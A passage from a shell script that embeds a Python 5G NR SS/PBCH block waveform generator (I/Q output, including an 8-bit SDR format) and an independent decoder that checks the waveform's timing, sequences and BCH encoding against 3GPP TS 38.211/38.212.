          "DC-centred grid" % (n_raster, n_raster // 2))
    print("kssb_msb\t0")
    print("generator_version\t%s" % GEN_VERSION)
    print("ref\tTS 38.211 7.4.3 (SS/PBCH block: 240 subcarriers, PSS/SSS/PBCH/"
          "PBCH DMRS) + 5.3 (CP-OFDM): ONE SSB burst at baseband - four OFDM "
          "symbols with one CP each, tiled --reps times back to back (no gap "
          "between bursts); NOT a full SSB burst set (no other candidates, no "
          "20 ms period, no half-frame timing) and NOT attached to a carrier "
          "(no RF centre frequency, no CORESET#0)")
    print("built\tyes")
    return 0


def main():
    if len(sys.argv) < 6:
        sys.stderr.write("ERROR\tusage: nr_ssb_bb.py <out.c16> <pci> <scs_khz> "
                         "<nfft> <sf> [--slot N] [--detail FILE] [--i8 FILE] "
                         "[--burst --format F --nrb N --i-ssb I --reps R "
                         "--l-max L --l0 S]\n")
        return 2
    out, pci, scs, nfft, sf = (sys.argv[1], int(sys.argv[2]), int(sys.argv[3]),
                               int(sys.argv[4]), int(sys.argv[5]))
    detail = None
    if "--detail" in sys.argv:
        detail = sys.argv[sys.argv.index("--detail") + 1]
    # --i8 writes the same waveform as 8-bit signed I/Q, which is the format a
    # driver's own CLI may read (hackrf_transfer). It is a rounding of the
    # identical array, not a second modulation.
    i8 = sys.argv[sys.argv.index("--i8") + 1] if "--i8" in sys.argv else None
    nslot = int(sys.argv[sys.argv.index("--slot") + 1]) if "--slot" in sys.argv else 0
    if scs not in SCS_SUPPORTED:
        sys.stderr.write("ERROR\tSCS %d kHz has no numerology in TS 38.211 "
                         "4.2\n" % scs)
        return 2
    mu = {15: 0, 30: 1, 60: 2, 120: 3, 240: 4}[scs]
    if not 0 <= nslot < 2 ** mu:
        sys.stderr.write("ERROR\tslot %d is outside subframe mu=%d (0..%d)\n"
                         % (nslot, mu, 2 ** mu - 1))
        return 2
    if not 0 <= sf <= 1023:
        sys.stderr.write("ERROR\tSFN %d does not fit the 10 bits the PBCH "
                         "carries (38.212 7.1.1)\n" % sf)
        return 2
    fs = scs * 1000 * nfft
    # L_max (TS 38.213 4.1) selects which 7.1.1 branch fills a_{A+5}..a_{A+7}:
    # 4 or 8 in FR1, 64 for the FR2 SSB cases D and E. It is derived from the
    # numerology rather than assumed. Only i_SSB = 0 is emitted, so the half
    # frame bit and the k_SSB MSB are 0 as well.
    l_max = 64 if scs >= 120 else 8
    hrf, kssb_msb = 0, 0
    if "--burst" in sys.argv:
        # The waveform export (--ssb-waveform): one SSB burst in a channel
        # raster, instead of one slot of the carrier. l_max, i_SSB and the
        # burst's subframe symbol index come in as flags because they are the
        # cell's parameters, not the generator's defaults.
        return burst_waveform(out, pci, scs, nfft, sf)
    grids = build_grid(pci, scs, nfft, mib_payload(sf), 0, sf, hrf, l_max,
                       kssb_msb)
    bch_pin_check()
    # TS 38.213 4.1: the four SSB symbols are consecutive from the candidate
    # start symbol (Case A: 2, Case B/C/D: 4) — not one every four symbols.
    syms_in_slot = [ssb_symbols_in_slot(scs)[0] + k for k in range(4)]
    cps = cp_lengths(mu, nslot, nfft)

    iq = np.zeros(0, dtype=complex)
    for l in range(14):
        if l in syms_in_slot:
            g = grids[syms_in_slot.index(l)]
            f = np.zeros(nfft, dtype=complex)
            f[(nfft - 120):nfft] = g[0:120]     # k = -120 .. -1
            f[0:120] = g[120:240]               # k =   0 .. 119
            body = np.fft.ifft(f) * np.sqrt(nfft)
        else:
            body = np.zeros(nfft, dtype=complex)
        iq = np.concatenate([iq, body[-cps[l]:], body])

    peak = np.max(np.abs(iq)) or 1.0
    scale = 32000.0 / peak
    i16 = np.round(iq.real * scale).astype("<i2")
    q16 = np.round(iq.imag * scale).astype("<i2")
    inter = np.empty(i16.size * 2, dtype="<i2")
    inter[0::2] = i16
    inter[1::2] = q16
    inter.tofile(out)
    if i8:
        # 16-bit sample / 256 == 8-bit sample: the same waveform, one rounding
        # of the same array, so the file a driver reads and the file the
        # decoder verified cannot disagree about anything but quantisation.
        v8 = np.clip(np.rint(inter.astype(np.float64) / 256.0),
                     -128, 127).astype(np.int8)
        v8.tofile(i8)

    if detail:
        with open(detail, "w") as fh:
            for l in range(4):
                fh.write("%d\t%s\n" % (l, " ".join(
                    "%d:%.6f:%.6f" % (i, v.real, v.imag)
                    for i, v in enumerate(grids[l]) if v != 0)))

    print("pss_pinned_checked\t%d" % CHECKS.get("pss", (0, False))[0])
    print("pss_pinned_agree\t%s" % ("1" if CHECKS.get("pss", (0, False))[1] else "0"))
    print("sss_pinned_checked\t%d" % CHECKS.get("sss", (0, False))[0])
    print("sss_pinned_agree\t%s" % ("1" if CHECKS.get("sss", (0, False))[1] else
                                    ("n/a" if "sss" not in CHECKS else "0")))
    print("dmrs_pinned_checked\t%d" % CHECKS.get("dmrs", (0, False))[0])
    print("dmrs_pinned_agree\t%s" % ("1" if CHECKS.get("dmrs", (0, False))[1] else
                                     ("n/a" if "dmrs" not in CHECKS else "0")))
    print("dmrs_c_init\t%d" % ((2 ** 11) * (0 + 1) * (pci // 4 + 1) + 64 + pci % 4))
    print("dmrs_re\t%d" % CHECKS.get("dmrs_re", (0, False))[0])
    print("pbch_re\t%d" % CHECKS.get("pbch_re", (0, False))[0])
    print("pbch_re_driven\t%d" % CHECKS.get("pbch_driven", (0, False))[0])
    # The BCH chain's stages, as machine-readable TSV, so an independent
    # checker can compare each one against the clause instead of against this
    # file's own constants: the 32-bit interleaved+scrambled payload, the
    # 56-bit K after CRC24C, the 864-bit rate-matched codeword, and the
    # codeword after the TS 38.211 7.3.3.1 scrambling.
    pl = payload_scramble(payload_generate(mib_payload(sf), sf, hrf, l_max,
                                           kssb_msb, 0), sf, l_max, pci)
    cw = bch_encode(mib_payload(sf), sf, hrf, l_max, kssb_msb, 0, pci)
    scr = pbch_coded_scramble(cw, pci, 0, l_max)
    print("mib_hex\t%s" % bits_to_hex(mib_payload(sf)))
    print("sfn\t%d" % sf)
    print("mib_sfn_field\t%d" % (sf >> 4))
    print("bch_payload_hex\t%s" % bits_to_hex(pl))
    print("bch_k_hex\t%s" % bits_to_hex(pl + crc24c(pl)))
    print("bch_codeword_hex\t%s" % bits_to_hex(cw))
    print("bch_scrambled_hex\t%s" % bits_to_hex(scr))
    print("bch_payload_bits\t32")
    print("bch_k_bits\t56")
    print("bch_codeword_bits\t864")
    print("generator_version\t%s" % GEN_VERSION)
    print("bch_l_max\t%d" % l_max)
    print("bch_hrf\t%d" % hrf)
    print("bch_kssb_msb\t%d" % kssb_msb)
    print("bch_i_ssb\t0")
    print("bch_pinned_checked\t%d" % CHECKS.get("bch", (0, False))[0])
    print("bch_pinned_agree\t%s" % ("1" if CHECKS.get("bch", (0, False))[1]
                                    else "0"))
    print("bch_scrambled_pinned_agree\t%s"
          % ("1" if CHECKS.get("bch_scrambled", (0, False))[1] else "0"))
    print("pbch_scramble_nu\t%d" % (0 & (3 if l_max <= 4 else 7)))
    print("pbch_scramble_c_init\t%d" % pci)
    print("pss_derivation\t%s" % PSS_FORM)
    print("sss_derivation\t%s" % SSS_FORM)
    print("fs_hz\t%d" % fs)
    print("nfft\t%d" % nfft)
    print("mu\t%d" % mu)
    print("slot\t%d" % nslot)
    print("slot_samples\t%d" % iq.size)
    print("slot_us\t%.3f" % (1e6 * iq.size / fs))
    print("subframe_samples\t%d" % (iq.size * 2 ** mu))
    print("cp_long\t%d" % max(cps))
    print("cp_short\t%d" % min(cps))
    print("cp_per_slot\t%d" % sum(cps))
    print("ssb_symbols\t%s" % ",".join(str(s) for s in syms_in_slot))
    print("iq_bytes\t%d" % (i16.size * 4))
    if i8:
        print("iq8_file\t%s" % i8)
        print("iq8_bytes\t%d" % (i16.size * 2))
    print("pbch_encoding\tTS 38.212 7.1 (payload, scramble, CRC24C, polar 512, "
          "rate match to 864) + TS 38.211 7.3.3.1 coded bit scrambling")
    return 0


if __name__ == "__main__":
    sys.exit(main())
NAIR_PYEOF
}

# Write the independent decoder. This is the assertion half of the transmit
# path: it reads the IQ file back, finds the OFDM symbol boundaries from the
# signal's own cyclicity, and recovers the SSB grid by FFT. It shares no code
# with the generator, carries its own copy of the spec sequences, and reports
# what it measured — so a waveform that is not what the generator claims is
# visible in its output rather than hidden by it.
nair_write_bb_dec() {
    mkdir -p "$MOD_TMP" 2>/dev/null
    cat > "$NAIR_BB_DEC_PY" <<'NAIR_PYEOF'
#!/usr/bin/env python3
"""Independent NR SSB decoder: IQ in, measurements out.

Nothing here reads the generator's code. The slot timing comes from the
TS 38.211 5.3.1 CP formula and the sample count alone, the SSB subcarrier map
from TS 38.211 7.4.3.1 and 7.4.1.4.1, the sequences are compared against
pinned chips taken from an independent TS 38.211 implementation as well as
against this file's own recursions, and the PBCH block is demodulated and its
CRC24C recomputed. Everything a caller might assert on is printed as TSV.
"""
import sys

import numpy as np

# Pinned chips (first 32) of the published sequences, transcribed from an
# independent TS 38.211 implementation. A drift in the recursions below then
# shows up as pss_pinned_agree / sss_pinned_agree = 0 instead of as silent
# agreement with a wrong sequence.
PSS_PINNED = {
    0: [1, -1, -1, 1, -1, -1, -1, -1, 1, 1, -1, -1, -1, 1, 1, -1, 1, -1, 1,
        -1, -1, 1, 1, -1, -1, 1, 1, 1, 1, 1, -1, -1],
    1: [1, 1, 1, -1, -1, 1, 1, -1, 1, 1, 1, -1, 1, 1, 1, 1, 1, 1, -1, 1, 1,
        -1, 1, 1, -1, -1, 1, -1, 1, 1, -1, -1],
    2: [-1, -1, -1, -1, -1, -1, 1, 1, 1, -1, -1, -1, 1, -1, -1, 1, 1, 1, -1,
        1, -1, 1, 1, -1, 1, -1, -1, -1, -1, -1, 1, -1],
}
SSS_PINNED = {
    0: [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, -1, 1, 1, 1, 1, 1, -1, 1, 1, 1, -1, 1,
        -1, 1, -1, 1, 1, -1, -1, 1, 1, 1],
    13: [1, 1, -1, -1, 1, -1, 1, 1, -1, 1, -1, -1, 1, 1, -1, 1, -1, 1, 1, -1,
         -1, 1, -1, -1, -1, 1, -1, 1, -1, -1, -1, 1],
    1007: [-1, 1, -1, -1, -1, -1, 1, 1, -1, 1, 1, -1, 1, -1, -1, 1, -1, -1,
           -1, -1, -1, -1, 1, 1, 1, -1, 1, -1, 1, -1, -1, 1],
}


# Pinned sign pattern of the first 12 PBCH DMRS chips (24 bits, I then Q) for
# the same cell identities, from the same independent implementation: a wrong
# c_init still produces QPSK symbols on the right subcarriers, so without a
# pin the DMRS values would go unchecked.
DMRS_PINNED = {
    0: "000011101110011011101101",
    13: "010110101010011100100100",
    42: "001001000101111100011000",
    1007: "000001111000010111101010",
}


def pss_any(nid2):
    """d_PSS(n) = 1 - 2*x((n + 43*N_ID(2)) mod 127), x(i+7) = (x(i+4)+x(i))
    mod 2, x(0..6) = 0,1,1,0,1,1,1. TS 38.211 7.4.2.2.1."""
    x = [0, 1, 1, 0, 1, 1, 1]
    for i in range(0, 120):
        x.append((x[i + 4] + x[i]) % 2)
    return np.array([1 - 2 * x[(n + 43 * nid2) % 127] for n in range(127)])


def mseq(init, taps, n_terms):
    """x(i+7) = (x(i+taps[0]) + x(i+taps[1])) mod 2, init = x(0..6)."""
    x = list(init)
    for i in range(0, n_terms + 7):
        x.append((x[i + taps[0]] + x[i + taps[1]]) % 2)
    return x


def sss_any(nid1, nid2):
    """TS 38.211 7.4.2.3.1: both sequences start at x(0..6) = 1,0,0,0,0,0,0;
    x0 uses taps (4,0) and x1 uses taps (1,0). Kept as a separate copy from
    the generator on purpose - a PCI search that locks on after a fix is then
    evidence about the waveform rather than about a shared helper."""
    m0 = 15 * (nid1 // 112) + 5 * nid2
    m1 = nid1 % 112
    x0 = mseq([1, 0, 0, 0, 0, 0, 0], (4, 0), 127 + m0)
    x1 = mseq([1, 0, 0, 0, 0, 0, 0], (1, 0), 127 + m1)
    return np.array([(1 - 2 * x0[(n + m0) % 127]) * (1 - 2 * x1[(n + m1) % 127])
                     for n in range(127)])


def load_c16(path):
    raw = np.fromfile(path, dtype="<i2").astype(float)
    if raw.size % 2:
        raise SystemExit("ERROR\tIQ file is not an even number of int16 samples")
    return raw[0::2] + 1j * raw[1::2]


def arg_opt(name, default=None):
    """Value of the flag NAME in sys.argv, or DEFAULT."""
    a = sys.argv
    return a[a.index(name) + 1] if name in a else default


def first_energy(iq, thresh=1.0):
    """First sample of the first symbol that carries energy. A slot can open
    with empty symbols (an SSB-only burst does), and a purely zero window has
    no correlation to measure, so every timing measurement starts here."""
    nz = np.nonzero(np.abs(iq) > thresh)[0]
    return int(nz[0]) if nz.size else 0


def detect_period(iq, s, max_lag, width=16, min_lag=16):
    """An OFDM symbol repeats its own body: within the cyclic prefix,
    iq[n + N_body] = iq[n]. Measuring that lag over a window inside the first
    energetic symbol gives N_FFT without using the CP formula at all. Lags
    below min_lag are skipped: the SSB occupies only 240 of the 240..4096
    subcarriers, so the signal is oversampled and neighbouring samples
    correlate strongly - a short-lag peak would say nothing about the body."""
    best, best_lag = -2.0, 0
    for lag in range(min_lag, max_lag + 1):
        a = iq[s:s + width]
        b = iq[s + lag:s + lag + width]
        n = min(a.size, b.size)
        if n < width:
            break
        den = np.sqrt(np.sum(np.abs(a) ** 2) * np.sum(np.abs(b) ** 2))
        if den == 0:
            continue
        rho = abs(np.vdot(a, b)) / den
        if rho > best:
            best, best_lag = rho, lag
    return best_lag, best


def spec_cp_pattern(nfft, mu, nslot):
    """TS 38.211 5.3.1 for the 14 symbols of one slot: N_CP = (144*2^-mu + 16)
    reference samples when the symbol is l = 0 or l = 7*2^mu of the subframe
    and 144*2^-mu otherwise; at f_s = N_FFT*dF that is 144*N_FFT/2048 and
    16*N_FFT*2^mu/2048 samples. None when N_FFT is off the numerology grid."""
    num_s = 144 * nfft
    num_x = 16 * nfft * (2 ** mu)
    if num_s % 2048 or num_x % 2048:
        return None
    short, extra = num_s // 2048, num_x // 2048
    l0 = nslot * 14
    return [short + extra if (l0 + l) in (0, 7 * (2 ** mu)) else short
            for l in range(14)]


def detect_slot_geometry(nsamples, mu, lo, hi):
    """The sample count over-determines the timing: for the numerology the 14
    symbol lengths are fixed by the CP formula, so (N_FFT, slot) are exactly
    the pairs whose pattern sums to nsamples. No generator knowledge."""
    hits = []
    for nfft in range(lo, hi + 1):
        for nslot in range(2 ** mu):
            pat = spec_cp_pattern(nfft, mu, nslot)
            if pat is None:
                continue
            if sum(pat) + 14 * nfft == nsamples:
                hits.append((nfft, nslot, pat))
    return hits


def split_slot(iq, pat, nfft):
    pos, syms, starts = 0, [], []
    for l in range(len(pat)):
        starts.append(pos)
        syms.append(iq[pos + pat[l]:pos + pat[l] + nfft])
        pos += pat[l] + nfft
    return syms, starts, pos


def spec_dmrs_re(v, s):
    """TS 38.211 7.4.1.4.1 / 7.4.3.1 DMRS subcarriers of SSB symbol s (0 is
    the PSS symbol): the comb k = v mod 4 over the whole 240 REs of symbols 1
    and 3, and the same comb inside symbol 2's two 48-RE PBCH blocks."""
    if s in (1, 3):
        return [k for k in range(240) if k % 4 == v]
    if s == 2:
        return [k for k in list(range(48)) + list(range(192, 240)) if k % 4 == v]
    return []


def spec_pbch_re(v, s):
    """The PBCH data REs of SSB symbol s in the spec's own order: ascending k
    outside the DMRS comb in symbols 1 and 3, and the two blocks of symbol 2.
    432 REs in all - the 864 polar-coded bits at QPSK."""
    if s in (1, 3):
        return [k for k in range(240) if k % 4 != v]
    if s == 2:
        return [k for k in list(range(48)) + list(range(192, 240)) if k % 4 != v]
    return []


def crc24c_bits(bits):
    """TS 38.212 5.1 gCRC24C = D^24+D^23+D^21+D^20+D^17+D^15+D^13+D^12+D^8
    +D^4+D^2+D+1 over a decoded block. The polynomial is written as its
    exponent set and then checked against the constant, because the
    neighbouring gCRC24A (0x864CFB) differs and a wrong one still produces
    plausible-looking bits. The register starts at ZERO and only the message
    bits are shifted in: that is the remainder 38.212 5.1 defines, and it is
    deliberately written here again rather than shared with the generator, so
    that the two ends cannot agree on the same mistake."""
    poly = 0
    for e in (24, 23, 21, 20, 17, 15, 13, 12, 8, 4, 2, 1, 0):
        poly |= 1 << e
    if poly != 0x1B2B117:
        raise SystemExit("ERROR\tgCRC24C exponent set does not build 0x1B2B117")
    reg = 0
    for b in bits:
        msb = (reg >> 23) & 1
        reg = (reg << 1) & 0xFFFFFF
        if msb ^ (b & 1):
            reg ^= poly
    return [(reg >> (23 - i)) & 1 for i in range(24)]


# ── The BCH chain (TS 38.212 7.1) decoded, not assumed ─────────────────────
# The tables are the specification's (TS 38.212 Tables 5.3.1.2-1, 5.3.1.1-1 and
# 7.1.1-1), repeated here on purpose: this decoder is a second implementation,
# and a table shared with the generator would turn one misreading of it into
# apparent agreement between the two ends.
POLAR_Q512 = [
    0, 1, 2, 4, 8, 16, 32, 3, 5, 64, 9, 6, 17, 10, 18, 128,
    12, 33, 65, 20, 256, 34, 24, 36, 7, 129, 66, 11, 40, 68, 130, 19,
    13, 48, 14, 72, 257, 21, 132, 35, 258, 26, 80, 37, 25, 22, 136, 260,
    264, 38, 96, 67, 41, 144, 28, 69, 42, 49, 74, 272, 160, 288, 192, 70,
    44, 131, 81, 50, 73, 15, 320, 133, 52, 23, 134, 384, 76, 137, 82, 56,
    27, 97, 39, 259, 84, 138, 145, 261, 29, 43, 98, 88, 140, 30, 146, 71,
    262, 265, 161, 45, 100, 51, 148, 46, 75, 266, 273, 104, 162, 53, 193, 152,
    77, 164, 268, 274, 54, 83, 57, 112, 135, 78, 289, 194, 85, 276, 58, 168,
    139, 99, 86, 60, 280, 89, 290, 196, 141, 101, 147, 176, 142, 321, 31, 200,
    90, 292, 322, 263, 149, 102, 105, 304, 296, 163, 92, 47, 267, 385, 324, 208,
    386, 150, 153, 165, 106, 55, 328, 113, 154, 79, 269, 108, 224, 166, 195, 270,
    275, 291, 59, 169, 114, 277, 156, 87, 197, 116, 170, 61, 281, 278, 177, 293,
    388, 91, 198, 172, 120, 201, 336, 62, 282, 143, 103, 178, 294, 93, 202, 323,
    392, 297, 107, 180, 151, 209, 284, 94, 204, 298, 400, 352, 325, 155, 210, 305,
    300, 109, 184, 115, 167, 225, 326, 306, 157, 329, 110, 117, 212, 171, 330, 226,
    387, 308, 216, 416, 271, 279, 158, 337, 118, 332, 389, 173, 121, 199, 179, 228,
    338, 312, 390, 174, 393, 283, 122, 448, 353, 203, 63, 340, 394, 181, 295, 285,
    232, 124, 205, 182, 286, 299, 354, 211, 401, 185, 396, 344, 240, 206, 95, 327,
    402, 356, 307, 301, 417, 213, 186, 404, 227, 418, 302, 360, 111, 331, 214, 309,
    188, 449, 217, 408, 229, 159, 420, 310, 333, 119, 339, 218, 368, 230, 391, 313,
    450, 334, 233, 175, 123, 341, 220, 314, 424, 395, 355, 287, 183, 234, 125, 342,
    316, 241, 345, 452, 397, 403, 207, 432, 357, 187, 236, 126, 242, 398, 346, 456,
    358, 405, 303, 244, 189, 361, 215, 348, 419, 406, 464, 362, 409, 219, 311, 421,
    410, 231, 248, 369, 190, 364, 335, 480, 315, 221, 370, 422, 425, 451, 235, 412,
    343, 372, 317, 222, 426, 453, 237, 433, 347, 243, 454, 318, 376, 428, 238, 359,
    457, 399, 434, 349, 245, 458, 363, 127, 191, 407, 436, 465, 246, 350, 460, 249,
    411, 365, 440, 374, 423, 466, 250, 371, 481, 413, 366, 468, 429, 252, 373, 482,
    427, 414, 223, 472, 455, 377, 435, 319, 484, 430, 488, 239, 378, 459, 437, 380,
    461, 496, 351, 467, 438, 251, 462, 442, 441, 469, 247, 367, 253, 375, 444, 470,
    483, 415, 485, 473, 474, 254, 379, 431, 489, 486, 476, 439, 490, 463, 381, 497,
    492, 443, 382, 498, 445, 471, 500, 446, 475, 487, 504, 255, 477, 491, 478, 383,
    493, 499, 502, 494, 501, 447, 505, 506, 479, 508, 495, 503, 507, 509, 510, 511,
]
POLAR_IL_MAX = [
    0, 2, 4, 7, 9, 14, 19, 20, 24, 25, 26, 28, 31, 34, 42, 45, 49, 50, 51, 53,
    54, 56, 58, 59, 61, 62, 65, 66, 67, 69, 70, 71, 72, 76, 77, 81, 82, 83, 87, 88,
    89, 91, 93, 95, 98, 101, 104, 106, 108, 110, 111, 113, 115, 118, 119, 120, 122, 123, 126, 127,
    129, 132, 134, 138, 139, 140, 1, 3, 5, 8, 10, 15, 21, 27, 29, 32, 35, 43, 46, 52,
    55, 57, 60, 63, 68, 73, 78, 84, 90, 92, 94, 96, 99, 102, 105, 107, 109, 112, 114, 116,
    121, 124, 128, 130, 133, 135, 141, 6, 11, 16, 22, 30, 33, 36, 44, 47, 64, 74, 79, 85,
    97, 100, 103, 117, 125, 131, 136, 142, 12, 17, 23, 37, 48, 75, 80, 86, 137, 143, 13, 18,
    38, 144, 39, 145, 40, 146, 41, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159,
    160, 161, 162, 163,
]
PBCH_G = [16, 23, 18, 17, 8, 30, 10, 6, 24, 7, 0, 5, 3, 2, 1, 4,
          9, 11, 12, 13, 14, 15, 19, 20, 21, 22, 25, 26, 27, 28, 29, 31]
# Table 5.4.1.1-1: the sub-block interleaver pattern P(i), needed to undo
# 5.4.1.1 before inverting the polar transform.
P_SUBBLOCK = [0, 1, 2, 4, 3, 5, 6, 7, 8, 16, 9, 17, 10, 18, 11, 19,
              12, 20, 13, 21, 14, 22, 15, 23, 24, 25, 26, 28, 27, 29, 30, 31]
# The same stale-copy caveat as the generator's marker: this file is written by
# nair_write_bb_dec, which only runs on the transmit path.
DEC_VERSION = "nair-ssb-dec/3 (BCH inverse 38.211 7.3.3.1 + 38.212 7.1)"


def gold(c_init, length):
    """TS 38.211 5.2.1, Nc = 1600, written out again rather than imported."""
    nc = 1600
    x1 = [0] * (nc + length + 31)
    x2 = [0] * (nc + length + 31)
    x1[0] = 1
    for i in range(31):
        x2[i] = (c_init >> i) & 1
    for n in range(nc + length):
        x1[n + 31] = (x1[n + 3] + x1[n]) % 2
        x2[n + 31] = (x2[n + 3] + x2[n + 2] + x2[n + 1] + x2[n]) % 2
    return [(x1[n + nc] + x2[n + nc]) % 2 for n in range(length)]


def polar_info_positions(k, n):
    """TS 38.212 5.3.1.2 with 5.4.1.1: with E >= N there is no puncturing and
    no shortening, so Q_I^N is the k most reliable indices below N."""
    qn = [q for q in POLAR_Q512 if q < n]
    if k > len(qn):
        raise SystemExit("ERROR\tpolar code K = %d does not fit N = %d" % (k, n))
    return sorted(qn[len(qn) - k:])


def polar_frozen_mask(n, k):
    """True where the bit is frozen (TS 38.212 5.3.1.2/5.4.1.1)."""
    info = set(polar_info_positions(k, n))
    return [i not in info for i in range(n)]


def polar_deinterleave(cp, k):
    """Inverse of 5.3.1.1 with I_IL = 1: c'_k = c_Pi(k), so c_Pi(k) = c'_k."""
    off = 164 - k
    order = [POLAR_IL_MAX[m] - off for m in range(164) if POLAR_IL_MAX[m] >= off]
    c = [0] * k
    for idx, target in enumerate(order):
        c[target] = cp[idx]
    return c


def polar_inverse(d, frozen):
    """Invert the polar transform of TS 38.212 5.3.1.2 exactly. Over GF(2)
    G_N = G_2^{kron n} with G_2 = [[1,0],[1,1]], and G_2 is its own inverse, so
    G_N is an involution: the same n-stage butterfly that encodes also
    decodes. That holds because the waveform being checked is noiseless — a
    receiver would run soft successive cancellation — and it is stronger than
    a min-sum approximation, which makes wrong decisions whenever its f or g
    lands on a tie. The frozen positions are returned as a count rather than
    assumed: a codeword with a nonzero frozen bit is not a codeword."""
    u = list(d)
    n = len(u)
    half = 1
    while half < n:
        step = half << 1
        for i in range(0, n, step):
            for j in range(i, i + half):
                u[j] ^= u[j + half]
        half = step
    frozen_errors = sum(1 for i in range(n) if frozen[i] and u[i])
    return u, frozen_errors


def rate_recover(e, n):
    """Inverse of the 5.4.1.2 bit selection when E >= N: e_k = y_mod(k,N), so
    the first N bits of e are the sub-block interleaver's output y."""
    if len(e) < n:
        return None
    return e[:n]


def subblock_deinterleave(y):
    """Inverse of TS 38.212 5.4.1.1: y_n = d_J(n), so d_J(n) = y_n.
    Recovering only e[:N] is not enough — y is the polar encoder's output
    through this interleaver, and skipping this step leaves the decoder
    inverse-transforming an interleaved codeword."""
    n = len(y)
    if n % 32:
        raise SystemExit("ERROR\tthe polar code length %d is not 32 sub-blocks"
                         % n)
    d = [0] * n
    for k in range(n):
        i = (32 * k) // n
        d[P_SUBBLOCK[i] * (n // 32) + (k % (n // 32))] = y[k]
    return d


def payload_descramble(a, l_max, ncellid):
    """TS 38.212 7.1.2. The 2nd and 3rd SFN LSBs, the half frame bit and the
    SS/PBCH block index bits are never scrambled, which is what lets a receiver
    read v out of the received block before descrambling the rest."""
    m = {4: 29, 8: 29, 10: 28, 20: 27, 64: 26}[l_max]
    v = 2 * a[PBCH_G[7]] + a[PBCH_G[8]]
    excl = {PBCH_G[7], PBCH_G[8], PBCH_G[10]}
    if l_max == 10:
        excl.add(PBCH_G[13])
    elif l_max == 20:
        excl |= {PBCH_G[12], PBCH_G[13]}
    elif l_max == 64:
        excl |= {PBCH_G[11], PBCH_G[12], PBCH_G[13]}
    c = gold(ncellid, (v + 1) * m)
    out = list(a)
    j = 0
    for i in range(32):
        if i in excl:
            continue
        out[i] = a[i] ^ int(c[j + v * m])
        j += 1
    return out, v


def payload_deinterleave(a):
    """TS 38.212 7.1.1 read backwards: the MIB's six SFN bits, the SFN's four
    LSBs, the half frame bit, the k_SSB MSB and the rest of the MIB. The three
    a_{A+5}..a_{A+7} bits are also where the UPPER bits of the SSB index live
    for L_max 10/20/64 (payload_generate); they are returned raw so
    bch_decode can apply the L_max branch, which differs in which bit is which."""
    mib = [0] * 24
    for k in range(6):
        mib[1 + k] = a[PBCH_G[k]]
    j = 14
    for i in range(24):
        if 1 <= i <= 6:
            continue
        mib[i] = a[PBCH_G[j]]
        j += 1
    field = 0
    for k in range(6):
        field = (field << 1) | mib[1 + k]
    sfn = ((field << 4) | (a[PBCH_G[6]] << 3) | (a[PBCH_G[7]] << 2) |
           (a[PBCH_G[8]] << 1) | a[PBCH_G[9]])
    return (mib, sfn, a[PBCH_G[10]], a[PBCH_G[11]],
            (a[PBCH_G[11]], a[PBCH_G[12]], a[PBCH_G[13]]))


def bch_decode(coded, pci, l_max):
    """Invert TS 38.211 7.3.3.1 and then TS 38.212 7.1.5, 7.1.4, 7.1.3, 7.1.2
    and 7.1.1. nu (the candidate SS/PBCH block index LSBs) is not carried
    anywhere the receiver can read before descrambling, so every value the
    numerology allows is tried and the one whose CRC24C checks is kept."""
    out = {"decode_ok": 0, "attempts": 0}
    for nu in range(4 if l_max <= 4 else 8):
        out["attempts"] += 1
        c = gold(pci, nu * 864 + 864)
        descr = [coded[i] ^ int(c[i + nu * 864]) for i in range(864)]
        y = rate_recover(descr, 512)
        if y is None:
            continue
        u, frozen_errors = polar_inverse(subblock_deinterleave(y),
                                         polar_frozen_mask(512, 56))
        if frozen_errors:
            continue
        bits = polar_deinterleave([u[i] for i in polar_info_positions(56, 512)],
                                  56)
        if crc24c_bits(bits[:32]) != bits[32:]:
            continue
        a, v = payload_descramble(bits[:32], l_max, pci)
        mib, sfn, hrf, kssb_msb, idx_bits = payload_deinterleave(a)
        # TS 38.212 7.1.1 Table 7.1.1-1: L_max decides which of a_{A+5}..a_{A+7}
        # are SSB index bits — L_max 10 carries i_SSB bit 3, 20 carries bits 3-4,
        # 64 carries bits 3-5, and 4/8 carry none (a_{A+5} is the k_SSB MSB).
        # nu is only i_SSB mod 8 (38.211 7.3.3.1), so the full index is
        # nu | payload >> 3.
        upper = 0
        if l_max == 10:
            upper = idx_bits[2] << 3
        elif l_max == 20:
            upper = (idx_bits[1] << 4) | (idx_bits[2] << 3)
        elif l_max == 64:
            upper = (idx_bits[0] << 5) | (idx_bits[1] << 4) | (idx_bits[2] << 3)
        out.update({"decode_ok": 1, "nu": nu, "v": v, "mib": mib, "sfn": sfn,
                    "hrf": hrf, "kssb_msb": kssb_msb, "payload": bits[:32],
                    "k": bits, "i_ssb": upper | nu})
        return out
    return out


def main():
    if len(sys.argv) < 4:
        sys.stderr.write("ERROR\tusage: nr_ssb_decode.py <in.c16> <scs_khz> "
                         "<nfft_nominal> [--grid FILE] [--nfft N --nsym M "
                         "--l0 S] [--ssb-bin B] [--l-max L]\n")
        return 2
    path, scs, nfft_nom = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    grid_out = None
    if "--grid" in sys.argv:
        grid_out = sys.argv[sys.argv.index("--grid") + 1]
    mu = {15: 0, 30: 1, 60: 2, 120: 3, 240: 4}[scs]
    iq = load_c16(path)
    # A file that is not a slot: the --ssb-waveform burst is four symbols, so
    # its timing is not searched for, it is checked against the CP formula for
    # the symbols it claims. --ssb-bin is the FFT bin of SSB subcarrier 0 (the
    # slot path's -120 is "the SSB is centred on DC"); --l-max picks the
    # TS 38.212 7.1.1 payload branch.
    fixed = None
    if "--nfft" in sys.argv:
        fixed = (int(arg_opt("--nfft")), int(arg_opt("--nsym", 14)),
                 int(arg_opt("--l0", 0)))
    ssb_bin = int(arg_opt("--ssb-bin", -120))
    l_max_dec = int(arg_opt("--l-max", 64 if scs >= 120 else 8))
    # Only used by the pinned-DMRS comparison, which is pinned for i_SSB = 0:
    # the DMRS c_init of TS 38.211 7.4.1.4.1 depends on i_SSB.
    pin_ssb = int(arg_opt("--i-ssb", 0))

    # 1. Timing. The CP formula plus the sample count fixes the candidate
    # (N_FFT, slot) pairs; the SSB itself then picks between them, because a
    # wrong symbol length scrambles the grid and no PSS root correlates.
    if fixed:
        nfft, nsym, l0 = fixed
        pat = []
        for s in range(l0, l0 + nsym):
            c = spec_cp_pattern(nfft, mu, s // 14)
            if c is None:
                print("ERROR\tN_FFT %d is off the mu=%d numerology grid "
